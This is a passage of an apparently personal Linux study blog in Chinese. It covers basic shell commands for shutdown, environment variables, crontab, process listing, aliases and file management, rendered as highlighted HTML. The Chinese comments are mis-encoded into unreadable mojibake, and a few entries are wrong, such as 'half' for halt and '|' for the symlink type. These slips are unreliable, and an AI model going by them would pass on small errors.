class="comment">#äº”åˆ†é’Ÿä¹‹åå…³æœº</span></span><br><span class="line">init 0             <span class="comment">#ç«‹å³å…³æœº</span></span><br><span class="line">half               <span class="comment">#ç«‹å³å…³æœº</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#é‡å¯å‘½ä»¤</span></span><br><span class="line">shutdown -r 0/now  <span class="comment">#ç«‹å³é‡å¯</span></span><br><span class="line">init 6             <span class="comment">#ç«‹å³é‡å¯</span></span><br><span class="line">reboot             <span class="comment">#ç«‹å³é‡å¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹ä¸»æœºåï¼ˆä¿®æ”¹ä¹‹åè¦bashå‘½ä»¤åˆ·æ–°ï¼‰</span></span><br><span class="line">hostname name   <span class="comment">#ä¸´æ—¶ä¿®æ”¹</span></span><br><span class="line">hostnamectl set-hostname name  <span class="comment">#æ°¸ä¹…ä¿®æ”¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2&gt; é”™è¯¯é‡å®šå‘</span></span><br><span class="line"><span class="built_in">command</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment">#which æŸ¥æ‰¾$PATHä¸­è®¾ç½®å‘½ä»¤åŠå®‰è£…æ–‡ä»¶ç›®å½•æ‰€åœ¨ä½ç½®</span></span><br><span class="line"><span class="built_in">which</span> <span class="built_in">cat</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#export è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œä½¿å…¶åœ¨å½“å‰ shell åŠå­è¿›ç¨‹ä¸­ç”Ÿæ•ˆ</span></span><br><span class="line"><span class="comment">#ä¸´æ—¶è®¾ç½®</span></span><br><span class="line"><span class="built_in">export</span> NAME                <span class="comment"># å¯¼å‡ºå·²å­˜åœ¨çš„å˜é‡ä¸ºç¯å¢ƒå˜é‡</span></span><br><span class="line"><span class="built_in">export</span> NAME=value          <span class="comment"># å®šä¹‰å¹¶å¯¼å‡ºå˜é‡ â€œ=â€ä¸¤ä¾§ä¸èƒ½æœ‰ç©ºæ ¼</span></span><br><span class="line">NAME=value; <span class="built_in">export</span> NAME    <span class="comment"># ç­‰ä»·å†™æ³•</span></span><br><span class="line"><span class="built_in">unset</span> NAME                 <span class="comment"># åˆ é™¤å˜é‡</span></span><br><span class="line"><span class="comment">#æ°¸ä¹…è®¾ç½®</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export JAVA_HOME=&quot;/opt/java&quot;&#x27;</span> &gt;&gt; /etc/profile   <span class="comment"># å¯¹æ‰€æœ‰ç”¨æˆ·ç”Ÿæ•ˆ</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=&quot;$PATH:~/.local/bin&quot;&#x27;</span> &gt;&gt; ~/.bashrc  <span class="comment"># ä»…å¯¹å½“å‰ç”¨æˆ·ç”Ÿæ•ˆ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#env</span></span><br><span class="line"><span class="built_in">env</span> | grep NAME      <span class="comment"># æ£€æŸ¥ç¯å¢ƒå˜é‡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#alternatives ç®¡ç†ç³»ç»Ÿå‘½ä»¤çš„å¤šç‰ˆæœ¬å®ç°ï¼Œé¿å…æ–‡ä»¶å†²çª</span></span><br><span class="line">alternatives --config &lt;å‘½ä»¤å&gt;        <span class="comment"># æ‰‹åŠ¨é€‰æ‹©ç‰ˆæœ¬</span></span><br><span class="line">alternatives --remove &lt;åç§°&gt; &lt;è·¯å¾„&gt;   <span class="comment"># ç§»é™¤ç‰ˆæœ¬</span></span><br><span class="line">alternatives --display &lt;åç§°&gt;        <span class="comment"># æŸ¥çœ‹æ‰€æœ‰å¯ç”¨ç‰ˆæœ¬</span></span><br><span class="line">alternatives --install &lt;é“¾æ¥&gt; &lt;åç§°&gt; &lt;è·¯å¾„&gt; &lt;ä¼˜å…ˆçº§&gt;  <span class="comment"># æ·»åŠ æ–°ç‰ˆæœ¬</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#crontab è®¾ç½®å‘¨æœŸæ€§æ‰§è¡Œçš„ä»»åŠ¡</span></span><br><span class="line">crontab -e	        <span class="comment">#ç¼–è¾‘å½“å‰ç”¨æˆ·çš„ cron è¡¨ï¼ˆé¦–æ¬¡ä½¿ç”¨ä¼šé€‰æ‹©ç¼–è¾‘å™¨ï¼‰ã€‚</span></span><br><span class="line">crontab -l	        <span class="comment">#åˆ—å‡ºå½“å‰ç”¨æˆ·çš„æ‰€æœ‰å®šæ—¶ä»»åŠ¡ã€‚</span></span><br><span class="line">crontab -r	        <span class="comment">#åˆ é™¤å½“å‰ç”¨æˆ·çš„æ‰€æœ‰å®šæ—¶ä»»åŠ¡ï¼ˆè°¨æ…ä½¿ç”¨ï¼‰ã€‚</span></span><br><span class="line">crontab -u user -e	<span class="comment">#ä»¥ root èº«ä»½ç¼–è¾‘æŒ‡å®šç”¨æˆ·çš„ cron è¡¨ï¼ˆéœ€ root æƒé™ï¼‰ã€‚</span></span><br><span class="line"><span class="comment">#æ—¶é—´æ ¼å¼ï¼š[åˆ†é’Ÿ] [å°æ—¶] [æ—¥æœŸ] [æœˆä»½] [æ˜ŸæœŸ] command</span></span><br><span class="line"><span class="comment">#é€šé…ç¬¦ä¸ç‰¹æ®Šç¬¦å·ï¼š&quot;*&quot;ï¼šåŒ¹é…æ‰€æœ‰å€¼ | &quot;,&quot;ï¼šåˆ†éš”å¤šä¸ªå€¼ | &quot;-&quot;ï¼šæŒ‡å®šèŒƒå›´ | &quot;/&quot;ï¼šæŒ‡å®šé—´éš”</span></span><br><span class="line"><span class="comment">#ç›¸å¯¹æ—¶é—´ï¼š@daily | @weekly | @monthly | @reboot</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># free  æŸ¥çœ‹ç©ºé—´ä½¿ç”¨æƒ…å†µ</span></span><br><span class="line">free -h</span><br><span class="line"></span><br><span class="line"><span class="comment"># df æŸ¥çœ‹ç£ç›˜ä½¿ç”¨æƒ…å†µ</span></span><br><span class="line"><span class="built_in">df</span> -h</span><br><span class="line"></span><br><span class="line"><span class="comment">#ps</span></span><br><span class="line">a     <span class="comment"># æ˜¾ç¤ºç°è¡Œç»ˆç«¯æœºä¸‹çš„æ‰€æœ‰ç¨‹åºï¼ŒåŒ…æ‹¬å…¶ä»–ç”¨æˆ·çš„ç¨‹åºã€‚</span></span><br><span class="line">-A    <span class="comment"># æ˜¾ç¤ºæ‰€æœ‰ç¨‹åºã€‚</span></span><br><span class="line">c     <span class="comment"># åˆ—å‡ºç¨‹åºæ—¶ï¼Œæ˜¾ç¤ºæ¯ä¸ªç¨‹åºçœŸæ­£çš„æŒ‡ä»¤åç§°ï¼Œè€Œä¸åŒ…å«è·¯ å¾„ï¼Œå‚æ•°æˆ–å¸¸é©»æœåŠ¡çš„æ ‡ç¤ºã€‚</span></span><br><span class="line">-e    <span class="comment"># æ­¤å‚æ•°çš„æ•ˆæœå’ŒæŒ‡å®š&quot;A&quot;å‚æ•°ç›¸åŒã€‚</span></span><br><span class="line">e     <span class="comment"># åˆ—å‡ºç¨‹åºæ—¶ï¼Œæ˜¾ç¤ºæ¯ä¸ªç¨‹åºæ‰€ä½¿ç”¨çš„ç¯å¢ƒå˜é‡ã€‚</span></span><br><span class="line">f     <span class="comment"># ç”¨ASCIIå­—ç¬¦æ˜¾ç¤ºæ ‘çŠ¶ç»“æ„ï¼Œè¡¨è¾¾ç¨‹åºé—´çš„ç›¸äº’å…³ç³»ã€‚</span></span><br><span class="line">-H    <span class="comment"># æ˜¾ç¤ºæ ‘çŠ¶ç»“æ„ï¼Œè¡¨ç¤ºç¨‹åºé—´çš„ç›¸äº’å…³ç³»ã€‚</span></span><br><span class="line">-N    <span class="comment"># æ˜¾ç¤ºæ‰€æœ‰çš„ç¨‹åºï¼Œé™¤äº†æ‰§è¡ŒpsæŒ‡ä»¤ç»ˆç«¯æœºä¸‹çš„ç¨‹åºä¹‹å¤–ã€‚</span></span><br><span class="line">s     <span class="comment"># é‡‡ç”¨ç¨‹åºä¿¡å·çš„æ ¼å¼æ˜¾ç¤ºç¨‹åºçŠ¶å†µã€‚</span></span><br><span class="line">u     <span class="comment"># ä»¥ç”¨æˆ·ä¸ºä¸»çš„æ ¼å¼æ¥æ˜¾ç¤ºç¨‹åºçŠ¶å†µã€‚</span></span><br><span class="line">x     <span class="comment"># æ˜¾ç¤ºæ‰€æœ‰ç¨‹åºï¼Œä¸ä»¥ç»ˆç«¯æœºæ¥åŒºåˆ†</span></span><br><span class="line">ps aux   <span class="comment">#USER, PID, %CPU, %MEM, VSZ, RSS, TTY, STAT, START, TIME, COMMAND</span></span><br><span class="line">ps -ef   <span class="comment">#UID, PID, PPID, C, STIME, TTY, TIME, CMD</span></span><br><span class="line"><span class="comment"># è‹¥å…³æ³¨èµ„æºå ç”¨å’Œç”¨æˆ·åï¼Œç”¨ ps auxï¼›è‹¥éœ€åˆ†æè¿›ç¨‹å…³ç³»æˆ–ç”¨æˆ· IDï¼Œç”¨ ps -ef</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è®¾ç½®åˆ«å</span></span><br><span class="line"><span class="built_in">alias</span> eth0=<span class="string">&#x27;cat /etc/sysconfig/network-scripts/ifcfg-ens33&#x27;</span></span><br><span class="line"><span class="comment">#å–æ¶ˆåˆ«å</span></span><br><span class="line"><span class="built_in">unalias</span> eth0</span><br><span class="line"><span class="comment">#æ°¸ä¹…è®¾ç½®</span></span><br><span class="line"><span class="built_in">alias</span> eth0=<span class="string">&#x27;cat /etc/sysconfig/network-scripts/ifcfg-eth0&#x27;</span> &gt;&gt; /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment">#timedatectl  --ä¿®æ”¹æ—¶åŒºä¿¡æ¯ï¼Œä»¥åŠæ˜¾ç¤ºç³»ç»Ÿæ—¶é—´   å†…å®¹æ¯”è¾ƒè¯¦ç»†</span></span><br><span class="line"><span class="comment">#date    --å¿«é€Ÿç®€ä»‹æ˜¾ç¤ºæ—¶é—´ä¿¡æ¯</span></span><br><span class="line"><span class="comment">#&quot;%Y&quot; å¹´year| &quot;%m&quot; æœˆmouth | &quot;%d&quot; æ—¥day | &quot;%H&quot; æ—¶hour | &quot;%M&quot; åˆ†min | &quot;%S&quot; ç§’sec | &quot;%F&quot; å¹´-æœˆ-æ—¥ </span></span><br><span class="line"><span class="built_in">touch</span> `<span class="built_in">date</span> +%F`.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#jobs bg fg</span></span><br><span class="line"><span class="built_in">jobs</span>   <span class="comment">#ç”¨äºæŸ¥çœ‹åå°è¿è¡Œå¯åŠ¨</span></span><br><span class="line"><span class="built_in">bg</span>     <span class="comment">#å°†è¿›ç¨‹ä¿¡æ¯æ”¾å…¥åå°è¿è¡Œ</span></span><br><span class="line"><span class="built_in">fg</span>     <span class="comment">#å°†è¿›ç¨‹ä¿¡æ¯æ”¾å…¥å‰å°è¿è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#uname [é€‰é¡¹]</span></span><br><span class="line">-a æˆ– --all	             <span class="comment">#æ˜¾ç¤ºå…¨éƒ¨ç³»ç»Ÿä¿¡æ¯ï¼Œæ¶µç›–ç³»ç»Ÿåç§°ã€ä¸»æœºåã€å†…æ ¸ç‰ˆæœ¬ã€å¤„ç†å™¨ç±»å‹ç­‰å†…å®¹ã€‚</span></span><br><span class="line">-s æˆ– --kernel-name	     <span class="comment">#æ˜¾ç¤ºå†…æ ¸åç§°ï¼Œåƒ Linuxã€Darwinï¼ˆmacOSï¼‰ç­‰ã€‚</span></span><br><span class="line">-n æˆ– --nodename	         <span class="comment">#æ˜¾ç¤ºä¸»æœºåï¼Œä¹Ÿå°±æ˜¯è®¡ç®—æœºåœ¨ç½‘ç»œä¸­çš„æ ‡è¯†åç§°ã€‚</span></span><br><span class="line">-r æˆ– --kernel-release	 <span class="comment">#æ˜¾ç¤ºå†…æ ¸ç‰ˆæœ¬å·ï¼Œä¾‹å¦‚ 5.15.0-76-genericã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">tail</span> /var/log/messages    <span class="comment">#æŸ¥çœ‹ç³»ç»ŸæŠ¥é”™æ—¥å¿—</span></span><br></pre></td></tr></table></figure>
<h2 id="æ–‡ä»¶ç®¡ç†">æ–‡ä»¶ç®¡ç†</h2>
<h3 id="æ–‡ä»¶ç±»å‹">æ–‡ä»¶ç±»å‹</h3>
<p><img src="/posts/2c8b313c//image-20250714181833893.png" alt="image-20250714181833893"></p>
<p>â‘ æ–‡ä»¶å±æ€§ç´¢å¼•èŠ‚ç‚¹ --inode(å”¯ä¸€çš„)â€“èº«ä»½è¯å·<br>
â‘¡æ–‡ä»¶å±æ€§ä¿¡æ¯å’Œæ–‡ä»¶æƒé™ä¿¡æ¯<br>
â‘¢æ–‡ä»¶ç¡¬é“¾æ¥æ•°:æŸ¥çœ‹æ–‡ä»¶æ•°æ®ä¿¡æ¯çš„å¤šä¸ªé—¨(ç±»ä¼¼äºæŒ‚è½½)<br>
â‘£æ–‡ä»¶å±ä¸»ä¿¡æ¯:æ–‡ä»¶ç®¡ç†è€…/æ–‡ä»¶åˆ›å»ºè€…<br>
â‘¤æ–‡ä»¶å±ç»„ä¿¡æ¯/æ‰€å±ç”¨æˆ·ç»„ä¿¡æ¯: ä¾¿äºè¿›è¡Œæƒé™æ•´ä½“åˆ†é…<br>
â‘¥æ–‡ä»¶æ•°æ®ä¿¡æ¯å¤§å°å°ºå¯¸<br>
â‘¦æ–‡ä»¶æ•°æ®æœ€åä¿®æ”¹æ—¶é—´ä¿¡æ¯ï¼ˆMtimeï¼‰</p>
<p>æ–‡ä»¶ç±»å‹:å‘Šè¯‰ç³»ç»Ÿç®¡ç†è€…è¿™ä¸ªæ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ f(-) d c b s p l</p>
<table>
<thead>
<tr>
<th>æ–‡ä»¶ç±»å‹</th>
<th style="text-align:center">å­—ç¬¦</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>æ™®é€šæ–‡ä»¶</td>
<td style="text-align:center">-</td>
<td>æ–‡æœ¬ å›¾ç‰‡ç­‰</td>
</tr>
<tr>
<td>ç›®å½•æ–‡ä»¶</td>
<td style="text-align:center">d</td>
<td>ç›®å½•</td>
</tr>
<tr>
<td>é“¾æ¥å­—æ–‡ä»¶</td>
<td style="text-align:center">|</td>
<td>==Windows æ¡Œé¢å¿«æ·æ–¹å¼</td>
</tr>
<tr>
<td>å—è®¾å¤‡æ–‡ä»¶</td>
<td style="text-align:center">b</td>
<td>å­˜å‚¨æ•°æ®ä»¥ä¾›ç³»ç»Ÿå­˜å–çš„æ¥å£è®¾å¤‡ï¼Œç®€å•è€Œè¨€å°±æ˜¯ç¡¬ç›˜ã€‚</td>
</tr>
<tr>
<td>å­—ç¬¦è®¾å¤‡æ–‡ä»¶</td>
<td style="text-align:center">c</td>
<td>å³ä¸²è¡Œç«¯å£çš„æ¥å£è®¾å¤‡ï¼Œä¾‹å¦‚é”®ç›˜ã€é¼ æ ‡ç­‰ç­‰ã€‚</td>
</tr>
<tr>
<td>å¥—æ¥å­—æ–‡ä»¶</td>
<td style="text-align:center">s</td>
<td>è¿™ç±»æ–‡ä»¶é€šå¸¸ç”¨åœ¨ç½‘ç»œæ•°æ®è¿æ¥ã€‚å¯ä»¥å¯åŠ¨ä¸€ä¸ªç¨‹åºæ¥ç›‘å¬å®¢æˆ·ç«¯çš„è¦æ±‚ï¼Œå®¢æˆ·ç«¯å°±å¯ä»¥é€šè¿‡å¥—æ¥å­—æ¥è¿›è¡Œæ•°æ®é€šä¿¡ã€‚ç¬¬ä¸€ä¸ªå±æ€§ä¸º [s]ï¼Œæœ€å¸¸åœ¨ /var/runç›®å½•ä¸­çœ‹åˆ°è¿™ç§æ–‡ä»¶ç±»å‹</td>
</tr>
<tr>
<td>ç®¡é“æ–‡ä»¶</td>
<td style="text-align:center">p</td>
<td>FIFOä¹Ÿæ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–‡ä»¶ç±»å‹ï¼Œå®ƒä¸»è¦çš„ç›®çš„æ˜¯ï¼Œè§£å†³å¤šä¸ªç¨‹åºåŒæ—¶å­˜å–ä¸€ä¸ªæ–‡ä»¶æ‰€é€ æˆçš„é”™è¯¯ã€‚FIFOæ˜¯first-in-first-out(å…ˆè¿›å…ˆå‡º)çš„ç¼©å†™ã€‚</td>
</tr>
</tbody>
</table>
<p><img src="/posts/2c8b313c//image-20250719173617460.png" alt="image-20250719173617460"></p>
<p>è½¯è¿æ¥ä¸ç¡¬é“¾æ¥ï¼š</p>
<p>è½¯è¿æ¥ l</p>
<p>ç¡¬é“¾æ¥ f</p>
<p>è½¯è¿æ¥ï¼šå¯ä»¥æ–¹ä¾¿è°ƒå–æ•°æ®ä¿¡æ¯</p>
<p>å¤åˆ¶è¿æ¥çš„æ—¶å€™æ³¨æ„ å¤åˆ¶çš„åŸæ–‡ä»¶çš„inode æ˜¯çœŸå®çš„æ–‡ä»¶</p>
<p>æ³¨æ„ï¼š è½¯é“¾æ¥çš„inode å’ŒåŸæ–‡ä»¶çš„inode æ˜¯ä¸ä¸€æ ·çš„</p>
<p>â€‹    ç¡¬é“¾æ¥çš„inodeå’ŒåŸæ–‡ä»¶çš„inodeæ˜¯å®Œå…¨ä¸€æ ·çš„</p>
<p>è½¯é“¾æ¥æ˜¯ä¸€ä¸ªæ–°çš„æ–‡ä»¶  åˆ é™¤ä¸ä¼šæœ‰å½±å“</p>
<p>åˆ é™¤ç¡¬é“¾æ¥ä¼šåˆ é™¤åŸæ–‡ä»¶ï¼ˆå¦‚æœæœ‰å¤šä¸ªç¡¬é“¾æ¥ï¼Œåˆ é™¤åˆ°æœ€åä¸€ä¸ªç¡¬é“¾æ¥ä¼šåˆ é™¤åŸæ–‡ä»¶ï¼‰</p>
<p>ä¿®æ”¹ç¡¬é“¾æ¥ å³ä¿®æ”¹åŸæ–‡ä»¶</p>
<h3 id="æ–‡ä»¶ç®¡ç†å‘½ä»¤">æ–‡ä»¶ç®¡ç†å‘½ä»¤</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1 mkdir</span></span><br><span class="line"><span class="built_in">mkdir</span> directionName     <span class="comment">#åˆ›å»ºç›®å½•</span></span><br><span class="line"><span class="built_in">mkdir</span> &#123;src,tools&#125;       <span class="comment">#åŒæ—¶åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="built_in">mkdir</span> -p a/b/c/         <span class="comment">#åˆ›å»ºå¤šçº§ç›®å½•</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2 ls ll</span></span><br><span class="line"><span class="built_in">ls</span> -l    <span class="comment">#æŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶å±æ€§ä¿¡æ¯  ç­‰äºll</span></span><br><span class="line"><span class="built_in">ls</span> -lh   <span class="comment">#ä»¥äººç±»å¯è¯»æ–¹å¼æ˜¾ç¤ºæ–‡ä»¶å¤§å°ä¿¡æ¯  ç­‰äºll -h</span></span><br><span class="line"><span class="built_in">ls</span> -a    <span class="comment">#æŸ¥çœ‹ç›®å½•ä¸‹æ‰€æœ‰çš„æ•°æ®ä¿¡æ¯ åŒ…å«éšè—æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">ls</span> -li   <span class="comment">#æŸ¥çœ‹æ–‡ä»¶å±æ€§ç´¢å¼•èŠ‚ç‚¹indode  ç­‰äºll -i</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3 cd    #å¸¦&#x27;/&#x27;ç»å¯¹è·¯å¾„ï¼Œä¸å¸¦&#x27;/&#x27;ç›¸å¯¹è·¯å¾„</span></span><br><span class="line"><span class="built_in">cd</span> ~     <span class="comment">#è¿”å›å®¶ç›®å½• æˆ–ç›´æ¥ cd</span></span><br><span class="line"><span class="built_in">cd</span> /     <span class="comment">#è¿”å›æ ¹ç›®å½•</span></span><br><span class="line"><span class="built_in">cd</span> ..    <span class="comment">#åˆ‡æ¢è‡³ä¸Šçº§ç›®å½•</span></span><br><span class="line"><span class="built_in">cd</span> -     <span class="comment">#åˆ‡æ¢è‡³ä¸Šæ¬¡æ‰€åœ¨ç›®å½•</span></span><br><span class="line"><span class="built_in">cd</span> ~user <span class="comment">#è¿›å…¥åˆ°ç”¨æˆ·æ ¹ç›®å½•</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwd    #æŸ¥çœ‹å½“å‰æ‰€åœ¨ç›®å½•</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#4 rm</span></span><br><span class="line"><span class="built_in">rm</span> -r filename filename   <span class="comment">#é€’å½’åˆ é™¤</span></span><br><span class="line"><span class="built_in">rm</span> -f     <span class="comment">#å¼ºåˆ¶åˆ é™¤ï¼ˆæ— éœ€ç¡®è®¤ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#5 cp</span></span><br><span class="line"><span class="built_in">cp</span>  /è·¯å¾„/æ—§æ–‡ä»¶  /è·¯å¾„/æ–°æ–‡ä»¶</span><br><span class="line"><span class="built_in">cp</span>  -r  /è·¯å¾„/ç›®å½•   /è·¯å¾„/ç›®å½• <span class="comment">#æ‹·è´ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åˆ°å¦ä¸€ç›®å½•</span></span><br><span class="line">-a      <span class="comment">#ä¿æŒæ–‡ä»¶åŸæœ‰å±æ€§ï¼Œè¯¥é€‰é¡¹é€šå¸¸åœ¨å¤åˆ¶ç›®å½•æ—¶ä½¿ç”¨ï¼Œå®ƒä¿ç•™é“¾æ¥ã€æ–‡ä»¶å±æ€§ï¼Œå¹¶é€’å½’åœ°å¤åˆ¶ç›®å½•</span></span><br><span class="line"><span class="built_in">cp</span> a.txt b.txt <span class="comment">#æ‹·è´å¹¶æ”¹å</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#6 mv</span></span><br><span class="line"><span class="built_in">mv</span>  æ–‡ä»¶/ç›®å½•  æ–°ç›®å½•/</span><br><span class="line"><span class="built_in">mv</span> a b   <span class="comment">#ä¿®æ”¹æ–‡ä»¶å</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#7 touch</span></span><br><span class="line"><span class="built_in">touch</span> filename   <span class="comment">#åˆ›å»ºæ–°æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">touch</span> &#123;filename1,filename2&#125;  <span class="comment">#åŒæ—¶åˆ›å»º</span></span><br><span class="line"><span class="built_in">touch</span> &#123;1..5&#125;.txt <span class="comment">#åˆ›å»º1.txt 2.txt 3.txt 4.txt 5.txt </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#8 cat</span></span><br><span class="line"><span class="built_in">cat</span> -n filename  <span class="comment">#[å¸¦è¡Œå·]æŸ¥çœ‹æ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="built_in">cat</span> test.txt &gt;&gt; README  <span class="comment">#å°†test.txtçš„å†…å®¹è¿½åŠ åˆ°READMEæ–‡ä»¶ä¸­</span></span><br><span class="line"><span class="built_in">cat</span>&gt;&gt;a&lt;&lt;<span class="string">EOF      #è¿½åŠ æ–°å†…å®¹</span></span><br><span class="line"><span class="string">&gt; hello</span></span><br><span class="line"><span class="string">&gt; EOF</span></span><br><span class="line"><span class="built_in">cat</span>&gt;a&lt;&lt;<span class="string">EOF     #è¦†ç›–åŸå§‹å†…å®¹</span></span><br><span class="line"><span class="string">&gt; world</span></span><br><span class="line"><span class="string">&gt; EOF</span></span><br><span class="line"><span class="built_in">head</span> [-n]      <span class="comment">#æŸ¥çœ‹nè¡Œï¼ˆé»˜è®¤10è¡Œï¼‰</span></span><br><span class="line"><span class="built_in">tail</span> [-n]      <span class="comment">#æŸ¥çœ‹æœ«å°¾nè¡Œï¼ˆé»˜è®¤10è¡Œï¼‰</span></span><br><span class="line"><span class="built_in">tail</span> -f        <span class="comment">#åŠ¨æ€æŸ¥çœ‹æ–‡ä»¶ï¼Œå¯ç”¨äºè¿½è¸ªæ—¥å¿—æ–‡ä»¶ä¿¡æ¯å˜åŒ–</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#9 é‡å®šå‘</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;123456&quot;</span>&gt;hxjl.txt   <span class="comment">#è¦†ç›–é‡å®šå‘</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;123456&quot;</span>&gt;&gt;hxjl.txt  <span class="comment">#è¿½åŠ é‡å®šå‘</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#10 echo</span></span><br><span class="line"><span class="built_in">echo</span> -e         <span class="comment">#æ¿€æ´»è½¬ä¹‰å­—ç¬¦</span></span><br><span class="line"><span class="built_in">echo</span> -E         <span class="comment">#ä¸æ¿€æ´»è½¬ä¹‰å­—ç¬¦</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$envname</span>   <span class="comment">#æ‰“å°ç¯å¢ƒå˜é‡</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;this is test&quot;</span> &gt; test.txt <span class="comment">#å†™å…¥æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#11 grep</span></span><br><span class="line">grep [-å‚æ•°] string filename   <span class="comment">#æ–‡ä»¶ä¸­ç­›é€‰å­—ç¬¦ä¸²ï¼›</span></span><br><span class="line">-i             <span class="comment">#ä¸åŒºåˆ†å¤§å°å†™</span></span><br><span class="line">-n             <span class="comment">#æ˜¾ç¤ºè¡Œå·</span></span><br><span class="line">-c             <span class="comment">#ç»Ÿè®¡åŒ¹é…çš„è¡Œæ•°</span></span><br><span class="line">-v             <span class="comment">#æ’é™¤æŒ‡å®šä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#wc [é€‰é¡¹] [æ–‡ä»¶...]</span></span><br><span class="line">-l	    <span class="comment">#åªæ˜¾ç¤ºè¡Œæ•°ï¼ˆlinesï¼‰</span></span><br><span class="line">-w	    <span class="comment">#åªæ˜¾ç¤ºå•è¯æ•°ï¼ˆwordsï¼‰</span></span><br><span class="line">-c	    <span class="comment">#åªæ˜¾ç¤ºå­—èŠ‚æ•°ï¼ˆcharactersï¼‰</span></span><br><span class="line">-m	    <span class="comment">#åªæ˜¾ç¤ºå­—ç¬¦æ•°ï¼ˆåŒ…æ‹¬å¤šå­—èŠ‚å­—ç¬¦ï¼Œå¦‚ä¸­æ–‡ï¼‰</span></span><br><span class="line">-L	    <span class="comment">#æ˜¾ç¤ºæœ€é•¿è¡Œçš„é•¿åº¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#12 tree å±•ç¤ºç›®å½•ä¸‹çš„ç»“æ„</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#13 lrzsz</span></span><br><span class="line">rz -y           <span class="comment">#ä»Windowsä¸Šä¼ æ–‡ä»¶åˆ°Linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#14 wget</span></span><br><span class="line">wget url        <span class="comment">#ä¸‹è½½Webå†…å®¹åˆ°æœ¬æœº</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#15 file </span></span><br><span class="line">file fileName   <span class="comment">#æŸ¥çœ‹æ–‡ä»¶ç±»å‹/å±æ€§</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#16 rpm RPMæ˜¯Red Hatå…¬å¸éšRedhat Linuxæ¨å‡ºäº†ä¸€ä¸ªè½¯ä»¶åŒ…ç®¡ç†å™¨ï¼Œé€šè¿‡å®ƒèƒ½å¤Ÿæ›´åŠ è½»æ¾å®¹æ˜“åœ°å®ç°è½¯ä»¶çš„å®‰è£…ã€‚</span></span><br><span class="line"><span class="comment">#å¸¸è§ç”¨æ³•ï¼š</span></span><br><span class="line">rpm -ivh &lt;rpmåŒ…å&gt;        <span class="comment">#å®‰è£…è½¯ä»¶</span></span><br><span class="line">rpm -e &lt;rpmåŒ…å&gt;          <span class="comment">#å¸è½½å®‰è£…</span></span><br><span class="line">rpm -Uvh &lt;rpmåŒ…å&gt;        <span class="comment">#å‡çº§ä¸€ä¸ªrpm</span></span><br><span class="line">rpm -qi &lt;rpmåŒ…å&gt;         <span class="comment">#æ˜¾ç¤ºè½¯ä»¶å®‰è£…ä¿¡æ¯</span></span><br><span class="line">rpm -qa | grep xxx       <span class="comment">#æŸ¥è¯¢è½¯ä»¶æ˜¯å¦å®‰è£…ï¼ˆåŒ…æ‹¬ç›¸å…³ä¾èµ–ï¼‰</span></span><br><span class="line">rpm -qc &lt;åŒ…å&gt;	        <span class="comment">#ä»…åˆ—å‡ºåŒ…çš„é…ç½®æ–‡ä»¶</span></span><br><span class="line">rpm -qd &lt;åŒ…å&gt;	        <span class="comment">#ä»…åˆ—å‡ºåŒ…çš„æ–‡æ¡£æ–‡ä»¶ï¼ˆæ‰‹å†Œã€READMEç­‰ï¼‰</span></span><br><span class="line">rpm -qlp &lt;RPMæ–‡ä»¶è·¯å¾„&gt;	   <span class="comment">#æŸ¥è¯¢æœªå®‰è£…çš„RPMåŒ…å†…åŒ…å«å“ªäº›æ–‡ä»¶</span></span><br><span class="line">rpm -q --scripts &lt;åŒ…å&gt;	<span class="comment">#æŸ¥çœ‹åŒ…çš„å®‰è£…/å¸è½½è„šæœ¬</span></span><br><span class="line">-i, --install	     <span class="comment">#å®‰è£…è½¯ä»¶åŒ…	rpm -ivh package.rpm</span></span><br><span class="line">-v	--verbose        <span class="comment">#åˆ—å‡ºæ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œå®‰è£…è¿›åº¦	rpm -v install package.rpm</span></span><br><span 